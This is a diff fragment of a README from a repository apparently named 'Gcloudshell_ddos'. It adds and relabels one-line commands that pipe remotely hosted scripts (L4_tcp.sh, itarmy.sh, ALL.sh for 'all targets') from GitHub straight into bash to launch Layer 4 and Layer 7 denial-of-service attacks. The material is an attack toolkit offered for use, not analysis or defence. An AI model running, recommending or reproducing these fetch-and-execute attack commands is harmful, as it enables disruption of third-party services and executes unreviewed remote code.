@@ -13,9 +13,13 @@ curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos
 ```
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4_tcp.sh | bash
 ```
-:white_check_mark:**All list (*--itarmy*):**    
+:white_check_mark:***--itarmy*:**    
 ```
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/itarmy.sh | bash
+```
+:grey_question:**All targets:**    
+```
+curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/ALL.sh | bash
 ```
 :grey_question:**Розділений термінал (Layer7+Layer4):**    
 ```
